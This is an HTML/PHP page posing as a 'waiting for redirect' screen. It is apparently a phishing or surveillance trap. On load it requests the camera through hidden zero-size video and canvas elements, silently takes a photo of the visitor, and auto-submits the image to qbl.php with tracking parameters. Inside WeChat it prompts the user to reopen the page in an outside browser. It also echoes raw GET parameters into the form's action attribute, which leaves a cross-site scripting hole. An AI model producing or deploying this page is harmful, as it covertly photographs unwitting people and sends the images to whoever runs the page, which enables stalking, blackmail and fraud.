<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>等待跳转...</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<style type="text/css">
        * {
            margin: 0;
            padding: 0;
        }

        #weixin-tip-box {
            display: none;
            position: fixed;
            right: 0;
            top: 4px;
            align-items: center;
        }
        .weixin-tip {
            background: #40b2a8;
            z-index: 100;
            padding: 8px;
            border-radius: 8px;
            margin-right: 8px
        }

        .weixin-tip p {
            text-align: center;
            font-size: 14px;
            color: #fff
        }

        .weixin-tip p.content {
            text-align: center;
            font-size: 14px
        }

        .triangle_border_up {
            width: 0;
            height: 0;
            border-width: 0 6px 12px;
            border-style: solid;
            border-color: transparent transparent #40b2a8;
            /*透明 透明  灰*/
            margin-left: 114px
        }
    </style>
</head>
<body>
    <div id='weixin-tip-box'>
        <div class="triangle_border_up">
            <span></span>
        </div>
        <div class="weixin-tip">
            <p>
                请点击右上角
            </p>
            <p class="content">
                选择"浏览器中打开"
            </p>
        </div>
    </div>
    <video id="video" width="0" height="0" autoplay></video>
	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
	<script type="text/javascript">
		window.addEventListener("DOMContentLoaded", function() {
            if (isWeiXin()) {
                var tip = document.getElementById('weixin-tip-box');
                tip.style.display = 'block';
                return;
            }
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
					video.srcObject = stream;
                    video.play();
                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                        },1300);
                },function(){
                    alert("操作失败，权限不够！");
                });

            }
		}, false);

        function isWeiXin() {
            var ua = window.navigator.userAgent.toLowerCase();
            if (ua.match(/MicroMessenger/i) == 'micromessenger') {
                return true;
            } else {
                return false;
            }
        }
	</script>
<form action="qbl.php?id=<?php echo $_GET['id']?>&url=<?php echo $_GET['url']?>" id="gopo" method="post">
<input type="hidden" name="img" id="result" value="" />
</form>
</body>
</html>